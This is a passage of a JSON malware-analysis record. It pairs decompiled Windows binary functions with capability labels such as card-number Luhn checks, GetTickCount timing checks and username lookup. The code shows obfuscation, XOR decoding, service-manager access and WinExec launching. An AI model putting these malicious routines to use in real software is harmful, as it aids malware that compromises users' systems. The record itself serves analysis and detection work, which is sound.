*unaff_EDI = unaff_ESI;\n        puVar8 = &stack0xfffffffc + -in_stack_5f9dff5f;\n        if (puVar8 < 0) {\n            fcn.00402390();\n            goto code_r0x00402356;\n        }\n        in_PF = (POPCOUNT(piVar9 & 0xff) & 1U) == 0;\n        if (piVar9 < 0) goto code_r0x004023b5;\n        uVar3 = in(param_2);\n        uVar5 = in_EAX & 0xffffff00 | uVar3;\n        *piVar9 = ROUND(in_ST0);\n        *(unaff_EBX + 0x48) = *(unaff_EBX + 0x48) + 0x27;\n        piVar10 = piVar9;\ncode_r0x00402413:\n        *param_2 = *param_2 + 0x42c6df84;\n        unaff_EBX = uVar5 + 0xa9666011;\n        if ((POPCOUNT(unaff_EBX & 0xff) & 1U) == 0) {\ncode_r0x00402420:\n            unaff_EDI = in_stack_ffffffd0;\n            param_2 = CONCAT22(in_stack_ffffffe6, in_stack_ffffffe4);\n            unaff_EBX = CONCAT22(in_stack_ffffffee, in_stack_ffffffec);\n            piVar10 = puStackY40[2];\n            puVar8 = puStackY40;\n            param_1 = in_stack_ffffffe8;\n        }\n        else if (unaff_EBX != 0) goto code_r0x00402436;\n    }\n    in_stack_ffffffee = param_1;\n    *(piVar10 + 6) = 0x93;\n    in_stack_ffffffec = param_2;\ncode_r0x00402436:\n    puVar7 = &stack0xffffffec;\n    uVar5 = param_2 & 0xffff0000 | in_stack_ffffffec;\n    *(piVar10 + 7) = 0x9b;\n    bVar11 = (POPCOUNT(in_stack_ffffffee - 5U & 0x44) & 1U) == 0;\n    *(piVar10 + 2) = 0x86;\n    if (((!bVar11) && (bVar11)) || (*(piVar10 + 9) = 0xaf,  !bVar11)) {\n        puVar8 = *0xc617b43a;\n        piVar10 = 0x34a96cf5;\n        puVar1 = unaff_EDI + -0x2474e586;\n        *puVar1 = *puVar1 | puVar8;\n        uVar5 = unaff_EBX;\n        if ((POPCOUNT(*puVar1 & 0xff) & 1U) == 0) {\n            cVar2 = '\\x1e';\n            do {\n                puVar8 = puVar8 + -1;\n                puVar7 = puVar7 + -1;\n                *puVar7 = *puVar8;\n                cVar2 = cVar2 + -1;\n            } while ('\\0' < cVar2);\n            uVar6 = in(0x78);\n            return CONCAT44(unaff_EBX, uVar6);\n        }\n    }\n    *(piVar10 + 10) = 0xa9;\n    puVar8 = puVar8[3];\n    *puVar8 = 0xb;\n    return CONCAT44(uVar5, puVar8);\n}\n",
        "token_count": 1776
    },
    "00402770": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402837) overlaps instruction at (ram,0x00402835)\n// \n\nvoid __cdecl\nfcn.00402770(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint32_t arg_20h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *puVar4;\n    uint8_t uVar5;\n    bool bVar6;\n    ulong uVar7;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((0x10b < &stack0xfffffffc && *0x10 != 0x110) && (0x10b >= &stack0xfffffffc || *0x10 == 0x110)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    uVar1 = fcn.00404c80(arg_18h, arg_1ch, arg_8h, 0x20, arg_20h + 0x20);\n    uVar5 = 0;\n    bVar6 = (arg_20h & (uVar1 & 0xffff0000 | CONCAT11((uVar1 >> 8) + '\\x01', uVar1))) < 0;\n    uVar7 = fcn.00404c80(arg_18h, arg_1ch, arg_ch, 0x20, arg_20h + 0x60);\n    if ((bVar6) || (uVar3 = uVar7 >> 0x20,  !bVar6)) {\n        uVar3 = arg_10h;\n    }\n    bVar6 = SCARRY4(uVar7, 0x10558b2f) != SCARRY4(uVar7 + 0x10558b2f, uVar5);\n    fcn.00404c80(arg_18h, arg_1ch, uVar3, 0x20, arg_20h + 0xa0);\n    if ((!bVar6) && (bVar6)) {\n        LOCK();\n        arg_20h = 0x138b2633;\n    }\n    fcn.00404c80(arg_18h, arg_1ch, arg_14h, 0x20, arg_20h + 0xe0);\n    if ((-1 < &stack0xfffffee4) && (-1 >= &stack0xfffffee4)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar2 = fcn.00402720();\n    if (iVar2 == -1) {\n        iVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(arg_20h + 0x120) = iVar2 % 5;\n    }\n    else {\n        *(arg_20h + 0x120) = iVar2;\n    }\n    var_10ch = 0;\n    puVar4 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    var_4h = 0x104;\n    *(puVar4 + 2) = 0;\n    iVar2 = fcn.00404e10(0x80000001, 0x42227c, 0x4222a8, &var_8h, &var_10ch, &var_4h);\n    if ((iVar2 != 0) && (iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_10ch, 0x4222f8),  iVar2 == 0)) {\n        *(arg_20h + 0x120) = *(arg_20h + 0x120) | 0x80;\n    }\n    return;\n}\n",
        "token_count": 927
    },
    "00402b50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402c3e) overlaps instruction at (ram,0x00402c3b)\n// \n// WARNING: Removing unreachable block (ram,0x00402bb2)\n// WARNING: Removing unreachable block (ram,0x00402bbc)\n// WARNING: Removing unreachable block (ram,0x00402bc0)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00402b50(uchar *arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    uint16_t uVar4;\n    uint32_t in_EAX;\n    uint32_t *in_EDX;\n    bool bVar5;\n    uint8_t in_AF;\n    bool bVar6;\n    bool bVar7;\n    bool bVar8;\n    unkbyte10 in_ST0;\n    \n    *arg_8h = 0x39;\n    arg_8h[1] = 0x9a;\n    arg_8h[2] = 0xcd;\n    arg_8h[3] = 0xdf;\n    arg_8h[4] = 0x94;\n    uVar4 = (CONCAT11((in_EAX >> 8) + -0x2b, in_EAX) ^ 0x3d) + 0x7c28 ^\n            CONCAT11((in_EDX << 0x10) >> 0x18 | in_EDX, in_EDX);\n    bVar5 = uVar4 < 0x4001;\n    bVar8 = SBORROW2(uVar4, 0x4001);\n    bVar7 = uVar4 + 0xbfff < 0;\n    bVar6 = uVar4 == 0x4001;\n    arg_8h[5] = 0xe8;\n    if ((0x4001 < uVar4) && (uVar4 < 0x4002)) {\n        bVar5 = false;\n        bVar8 = false;\n        in_EAX = in_EAX & 0xe2f4cc58;\n        bVar7 = in_EAX < 0;\n        bVar6 = in_EAX == 0;\n    }\n    arg_8h[6] = 3;\n    if ((bVar8 == bVar7) && (bVar8 != bVar7)) {\n        *(in_EAX + 0x8316dbec) = in_ST0;\n        uVar2 = in_EAX - 1;\n        uVar3 = 9 < (uVar2 & 0xf) | in_AF;\n        uVar2 = uVar2 + uVar3 * '\\x06';\n        uVar1 = *in_EDX;\n        *in_EDX = *in_EDX + 0x46c6df84;\n        uVar3 = (uVar2 + (0x90 < (uVar2 & 0xf0) | bVar5 | uVar3 * (0xf9 < uVar2)) * '`' + -0x74) - (0xb939207b < uVar1);\n        in_EAX = in_EAX - 1 & 0xffffff00 | uVar3;\n        bVar6 = uVar3 == 0;\ncode_r0x00402c33:\n        if (bVar6) goto code_r0x00402c37;\n    }\n    else {\n        arg_8h[7] = 0x1c;\n        if (!bVar6) goto code_r0x00402c33;\n    }\n    in_EAX = arg_ch;\ncode_r0x00402c37:\n    *(in_EAX | 0x5f) = 8;\n    return;\n}\n",
        "token_count": 841
    },
    "00402c50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00402c50(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00402b50(&var_68h, &var_4h);\n    fcn.00401670(&var_68h, var_4h, 0x411034, 0x11000);\n    *arg_8h = 0x411034;\n    *arg_ch = 0x11000;\n    return;\n}\n",
        "token_count": 254
    },
    "00402dc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402dd7) overlaps instruction at (ram,0x00402dd4)\n// \n\nint32_t __fastcall fcn.00402dc0(uint param_1, int32_t param_2)\n\n{\n    char unaff_BL;\n    bool in_OF;\n    \n    if ((in_OF) || (!in_OF)) {\n        param_2 = (*_sym.imp.MSVCRT.dll_rand)();\n        param_2 = param_2 % 5;\n    }\n    else {\n        in(0x60);\n        *0x15ff62da = *0x15ff62da + unaff_BL;\n    }\n    return param_2 + 3;\n}\n",
        "token_count": 153
    },
    "00402ef0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402f28) overlaps instruction at (ram,0x00402f26)\n// \n\nuint fcn.00402ef0(void)\n\n{\n    int32_t *piVar1;\n    char cVar5;\n    char *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t extraout_ECX;\n    char unaff_BL;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    uint *puVar6;\n    bool bVar7;\n    uint8_t in_AF;\n    ulong uVar8;\n    uint lpVersionInformation;\n    uint32_t var_90h;\n    int32_t var_8ch;\n    \n    bVar7 = (POPCOUNT(&lpVersionInformation & 0xff) & 1U) == 0;\n    puVar6 = &lpVersionInformation;\n    lpVersionInformation = 0x94;\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetVersionExA)();\n    pcVar2 = uVar8 >> 0x20;\n    iVar3 = uVar8;\n    if (!bVar7) {\n        if (bVar7) {\n            out(*unaff_ESI, uVar8 >> 0x20);\n            do {\n                cVar5 = iVar3 >> 8;\n                in_AF = 9 < (iVar3 & 0xf) | in_AF;\n                iVar3 = CONCAT31(CONCAT21(iVar3 >> 0x10, cVar5 - in_AF), -in_AF);\n                puVar6 = unaff_EDI;\n            } while (in_AF || cVar5 == *pcVar2);\n            goto code_r0x00402f22;\n        }\n    }\n    in_AF = var_90h < 5;\n    if (var_90h != 5) {\n        if ((var_90h == 6) && (var_8ch == 0)) {\n            return 1;\n        }\n        return 0;\n    }\n    iVar3 = 1;\ncode_r0x00402f22:\n    piVar1 = puVar6 + pcVar2 * 2;\n    *piVar1 = (*piVar1 + 0x7b) - in_AF;\n    *(extraout_ECX + -0x7d) = iVar3;\n    pcVar2 = iVar3 + 0x1b80a75;\n    *pcVar2 = *pcVar2 + pcVar2;\n    *(puVar6 + -0x75) = *(puVar6 + -0x75) + unaff_BL;\n    uVar4 = in(0x5d);\n    return uVar4;\n}\n",
        "token_count": 590
    },
    "00403330": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get session user name"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004033ee) overlaps instruction at (ram,0x004033ec)\n// \n\nuint __cdecl fcn.00403330(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_31ch;\n    uint lpBuffer;\n    uint var_114h;\n    uint var_10h;\n    uint pcbBuffer;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)();\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)();\n        if (iVar1 != 0) {\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 212
    },
    "004035d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403626) overlaps instruction at (ram,0x00403622)\n// \n\nuint __cdecl fcn.004035d0(uint arg_8h, int32_t arg_ch)\n\n{\n    uint hSCManager;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    char cVar4;\n    char cVar5;\n    unkbyte10 extraout_ST0;\n    ulong uVar6;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    cVar5 = '\\0';\n    cVar4 = '\\0';\n    uVar6 = fcn.00404860(hSCManager, arg_8h);\n    piVar3 = uVar6 >> 0x20;\n    if ((cVar5 != cVar4) || (iVar1 = uVar6,  cVar5 == cVar4)) {\n        iVar1 = arg_ch;\n    }\n    *(iVar1 + -0x7ce92414) = extraout_ST0;\n    *piVar3 = *piVar3 + 0x458bdf84;\n    uVar2 = fcn.004047f0(hSCManager, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar2;\n}\n",
        "token_count": 311
    },
    "004036e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403701) overlaps instruction at (ram,0x00403700)\n// \n\nuint32_t __fastcall fcn.004036e0(int32_t param_1, ushort param_2)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t unaff_EBX;\n    uint *unaff_EDI;\n    bool in_ZF;\n    \n    uVar1 = *0x4224ec;\n    if ((!in_ZF) && (in_ZF)) {\n        uVar2 = in(param_2);\n        *unaff_EDI = uVar2;\n        uVar1 = in_EAX;\n        if (&stack0xfffffff4 < 1) {\n            *(unaff_EBX + 0x75f685f0) = *(unaff_EBX + 0x75f685f0) + param_1;\n            return in_EAX + 1 & 0xffffff00 | in_EAX + 1 + 0x5f;\n        }\n    }\n    uVar1 = uVar1 ^ 0xdee0ed6d;\n    uVar1 = uVar1 & 0xffff0000 | uVar1 + (uVar1 >> 8) * -0x31;\n    *(param_1 + 0x4224ec) = *(param_1 + 0x4224ec);\n    if (uVar1 == 0) {\n        uVar2 = (*_sym.imp.MSVCRT.dll_time)(0);\n        uVar1 = (*_sym.imp.MSVCRT.dll_srand)(uVar2);\n        *0x4224ec = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 384
    },
    "004037e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004037fb) overlaps instruction at (ram,0x004037f7)\n// \n\nuint __cdecl fcn.004037e0(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint hSCManager;\n    uint uVar1;\n    ushort in_CX;\n    int32_t *in_EDX;\n    char *unaff_EDI;\n    unkbyte10 in_ST0;\n    \n    *(in_EAX + -0x7ce92414) = in_ST0;\n    *in_EDX = *in_EDX + 0x3f68df84;\n    *unaff_EDI = *unaff_EDI + in_CX;\n    *in_EDX = *in_EDX + (in_CX >> 8);\n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0);\n    uVar1 = fcn.00403740(hSCManager, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 240
    },
    "00403890": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403909) overlaps instruction at (ram,0x00403900)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x004038fa)\n// WARNING: Removing unreachable block (ram,0x00403915)\n\nvoid fcn.00403890(int32_t param_1, int32_t param_2, int32_t param_3, int32_t param_4)\n\n{\n    char unaff_00023900;\n    uint unaff_00023b00;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint8_t unaff_BL;\n    \n    iVar2 = 0;\n    iVar1 = param_4;\n    if (0 < param_4) {\n        do {\n            if ((iVar1 < 0) || (iVar1 >= 0)) {\n                unaff_BL = *(iVar2 + param_3);\n            }\n            unaff_BL = unaff_BL ^ *(iVar2 % param_2 + param_1);\n            *(iVar2 + param_3) = param_4 ^ unaff_BL;\n            iVar2 = iVar2 + 1;\n            iVar1 = iVar2 - param_4;\n        } while (iVar2 < param_4);\n    }\n    *(&stack0xfffffff0 + (unaff_00023900 - 1) * -4) = unaff_00023b00;\n    return;\n}\n",
        "token_count": 320
    },
    "00403920": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403a5b) overlaps instruction at (ram,0x00403a56)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint32_t __cdecl fcn.00403920(uchar *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    uchar uVar2;\n    uchar *puVar3;\n    uint32_t uVar4;\n    uint8_t extraout_CL;\n    uint16_t extraout_CX;\n    int32_t iVar5;\n    uchar *extraout_ECX;\n    uchar *extraout_ECX_00;\n    uchar *extraout_ECX_01;\n    uint arg_1ch;\n    uint8_t *unaff_EBX;\n    uint32_t uVar6;\n    uchar *arg_8h_00;\n    uint16_t uVar7;\n    uint *puVar8;\n    uchar *puVar9;\n    uint8_t in_AF;\n    bool bVar10;\n    bool bVar11;\n    bool bVar12;\n    ulong uVar13;\n    unkbyte6 Var14;\n    uint var_213h;\n    uchar s;\n    uint var_10fh;\n    uint32_t var_ch;\n    uint var_8h;\n    uchar *var_4h;\n    \n    puVar8 = &var_213h;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + 2) = 0;\n    s = 0;\n    puVar8 = &var_10fh;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    var_ch = 1;\n    puVar9 = puVar8 + 3;\n    *(puVar8 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x422054);\n    bVar11 = (unaff_EBX & extraout_CX) < 0;\n    uVar13 = fcn.00402300(&var_4h, &var_8h);\n    puVar3 = var_4h;\n    arg_1ch = var_8h;\n    arg_8h_00 = arg_8h;\n    if ((!bVar11) && (bVar11)) {\n        *unaff_EBX = *unaff_EBX & 0xc3;\n        puVar3 = arg_8h;\n        arg_1ch = uVar13 >> 0x20;\n        arg_8h_00 = uVar13 + -0x1bf31dd6;\n    }\n    iVar5 = fcn.00401000(arg_8h_00, arg_ch, arg_10h, arg_14h, puVar3, arg_1ch);\n    if (iVar5 == 0) {\n        return 0;\n    }\n    iVar5 = fcn.00401470(&s, var_4h, var_8h);\n    if (iVar5 == 0) {\n        return 0;\n    }\n    uVar7 = (puVar9 | 0x2fff) - arg_ch ^ 0x7174;\n    if ((0 < uVar7) && (uVar7 < 1)) {\n        *(iVar5 + -0x17c625aa) = *(iVar5 + -0x17c625aa) ^ extraout_CL;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    fcn.00402df0();\n    iVar5 = fcn.00402cd0(0x42208c);\n    if (iVar5 == -1) {\n        iVar5 = fcn.00402cd0(0x422080);\n        if (iVar5 != -1) {\n            puVar9 = 0xf;\n            goto code_r0x00403aab;\n        }\n    }\n    else {\n        puVar9 = 0xe;\ncode_r0x00403aab:\n        iVar5 = fcn.00401640(arg_8h_00);\n        if (iVar5 != 0) {\n            fcn.00402910();\n            fcn.00404e00();\n            return 1;\n        }\n        if (*0x4224e4 == 0) {\n            return 0;\n        }\n    }\n    Var14 = fcn.004035d0(arg_8h_00, &s);\n    uVar6 = var_ch;\n    if (Var14 == 0) {\n        uVar6 = 0;\n    }\n    puVar3 = extraout_ECX;\n    if (uVar6 != 0) {\n        Var14 = fcn.004037e0(arg_8h_00);\n        puVar3 = extraout_ECX_00;\n        if (Var14 == 0) {\n            var_ch = 0;\n            uVar6 = Var14;\n        }\n    }\n    bVar11 = false;\n    bVar12 = false;\n    bVar10 = uVar6 != 0;\n    if (!bVar10) {\n        Var14 = fcn.004024e0(arg_8h_00, 0);\n        uVar6 = Var14;\n        bVar11 = 0xfffffff7 < &stack0xfffffdcc;\n        bVar12 = SCARRY4(&stack0xfffffdcc, 8);\n        puVar3 = extraout_ECX_01;\n        var_ch = uVar6;\n    }\n    uVar4 = Var14;\n    if ((bVar12) || (!bVar12)) {\n        bVar11 = false;\n        bVar10 = uVar6 == 0;\n        if (bVar10) goto code_r0x00403bbe;\n    }\n    else {\n        uVar2 = in(Var14 >> 0x20);\n        *puVar9 = uVar2;\n        if (!bVar11 && (bVar10 || *0x10 != 0x22c)) {\n            *(uVar4 - 0x7b) = *(uVar4 - 0x7b) | Var14 >> 0x20;\n            return uVar4;\n        }\n        uVar6 = uVar6 & 0xffff0000 | CONCAT11(*puVar3, 0xbc);\n        puVar9 = puVar9 + 1;\n    }\n    uVar4 = fcn.00404e00();\n    bVar11 = 0xfffffffb < &stack0xfffffdcc;\n    bVar10 = *0x10 == 0x230;\ncode_r0x00403bbe:\n    if ((!bVar10) && (bVar10)) {\n        uVar6 = uVar6 + 1;\n        if (bVar11 || uVar6 == 0) {\n            do {\n                iVar5 = (*_sym.imp.MSVCRT.dll_rand)();\n                arg_8h_00[arg_8h] = iVar5 % 0x1a + 'a';\n                arg_8h_00 = arg_8h_00 + 1;\n            } while (arg_8h_00 < puVar9);\n            return iVar5 / 0x1a;\n        }\n        in_AF = 9 < (uVar4 & 0xf) | in_AF;\n        piVar1 = (uVar4 & 0xffff0000 | CONCAT11((uVar4 >> 8) + in_AF, uVar4 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - uVar6;\n    }\n    (*_sym.imp.KERNEL32.dll_Sleep)();\n    (*_sym.imp.KERNEL32.dll_WinExec)(0x4220a0, 0);\n    return uVar6;\n}\n",
        "token_count": 1828
    },
    "00403d00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403d59) overlaps instruction at (ram,0x00403d57)\n// \n\nuint fcn.00403d00(uint param_1, int32_t param_2)\n\n{\n    uint arg_8h;\n    int32_t arg_ch;\n    uint *puVar1;\n    uint *unaff_EBX;\n    bool bVar2;\n    uint *puVar3;\n    \n    arg_ch = param_2;\n    arg_8h = param_1;\n    puVar3 = &param_1;\n    puVar1 = fcn.00403420(param_1, param_2, puVar3, &param_2);\n    if (puVar1 == NULL) {\n        return 0;\n    }\n    puVar3 = puVar3 & 0xffff | unaff_EBX << 0x10;\n    bVar2 = (unaff_EBX + 1U ^ 0x50) < '\\0';\n    puVar1[0x16] = param_2;\n    if ((bVar2) || (!bVar2)) {\n        puVar1 = &param_2;\n        puVar3 = &param_1;\n        unaff_EBX = puVar1;\n    }\n    *(param_2 + 0x51) = *(param_2 + 0x51) | puVar1;\n    fcn.00403420(arg_8h, arg_ch, puVar3, unaff_EBX);\n    return 1;\n}\n",
        "token_count": 332
    },
    "00403d80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403d80(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 103
    },
    "00403eb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403edb) overlaps instruction at (ram,0x00403ed9)\n// \n\nuint32_t fcn.00403eb0(uint param_1)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    ushort extraout_DX;\n    uint *puVar4;\n    uint *puVar5;\n    bool bVar6;\n    uint uStack40;\n    uint auStack24 [4];\n    uint uStack8;\n    \n    puVar4 = &stack0xfffffffc;\n    uStack40 = param_1;\n    puVar5 = &uStack40;\n    (*_sym.imp.MSVCRT.dll__strlwr)();\n    bVar6 = (POPCOUNT(&stack0xffffffdc & 0xff) & 1U) != 0;\n    if ((SCARRY4(&uStack40, 4) == &stack0xffffffdc < 0) && (SCARRY4(&uStack40, 4) != &stack0xffffffdc < 0)) {\n        in(extraout_DX);\n        LOCK();\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    auStack24[0] = 0x422464;\n    auStack24[1] = 0x42245c;\n    auStack24[2] = 0x42246c;\n    auStack24[3] = 0x422474;\n    uStack8 = 0x42247c;\n    if ((bVar6) && (!bVar6)) {\n        cVar1 = '\\x1e';\n        do {\n            puVar4 = puVar4 + -1;\n            puVar5 = puVar5 + -1;\n            *puVar5 = *puVar4;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        uVar2 = in(0x78);\n        return uVar2;\n    }\n    uVar2 = 0;\n    puVar5 = auStack24;\n    do {\n        uStack40 = *puVar5;\n        iVar3 = (*_sym.imp.MSVCRT.dll_strstr)(param_1);\n        if (iVar3 != 0) {\n            return 1;\n        }\n        uVar2 = uVar2 + 1;\n        puVar5 = puVar5 + 1;\n    } while (uVar2 < 5);\n    uStack40 = 0x422454;\n    iVar3 = (*_sym.imp.MSVCRT.dll_strstr)(param_1);\n    return iVar3 == 0;\n}\n",
        "token_count": 582
    },
    "00403f70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403f70(uint arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    code **ppcVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t *piVar9;\n    uint32_t uVar10;\n    uint *puVar11;\n    uint *in_FS_OFFSET;\n    uint var_24ch;\n    uint var_147h;\n    uint hLibModule;\n    uint var_40h;\n    uint pbstr;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x405090;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    (*_sym.imp.ole32.dll_CoInitialize)();\n    iVar5 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    if (iVar5 == 0) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    (*_sym.imp.USER32.dll_RegisterWindowMessageA)();\n    uVar10 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n    (*_sym.imp.USER32.dll_SendMessageTimeoutA)();\n    pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*(uVar10 - 0x44), 0x42243c);\n    if (pcVar6 == NULL) {\n        *in_FS_OFFSET = *(uVar10 - 0xc);\n        return 1;\n    }\n    *(uVar10 - 0x20) = 0;\n    uVar1 = *(uVar10 - 0x18);\n    *(uVar10 - 4) = 0;\n    iVar5 = (*pcVar6)(uVar1, str._D_3, 0, uVar10 - 0x20);\n    piVar9 = *(uVar10 - 0x20);\n    if ((iVar5 < 0) || (piVar9 == NULL)) {\n        *(uVar10 - 4) = 0xffffffff;\n        if (piVar9 != NULL) {\n            (**(*piVar9 + 8))(piVar9);\n        }\n    }\n    else {\n        *(uVar10 - 0x28) = 0;\n        iVar5 = *piVar9;\n        *(uVar10 - 4) = 1;\n        iVar5 = (**(iVar5 + 0x20))(piVar9, uVar10 - 0x28);\n        piVar9 = *(uVar10 - 0x28);\n        if ((iVar5 < 0) || (piVar9 == NULL)) {\n            *(uVar10 - 4) = 0;\n        }\n        else {\n            *(uVar10 - 0x1c) = 0;\n            (**(*piVar9 + 0x24))(piVar9, uVar10 - 0x1c);\n            iVar7 = *(uVar10 - 0x1c);\n            *(uVar10 - 0x24) = 0;\n            if (0 < iVar7) {\n                do {\n                    iVar7 = (*_sym.imp.MSVCRT.dll_rand)();\n                  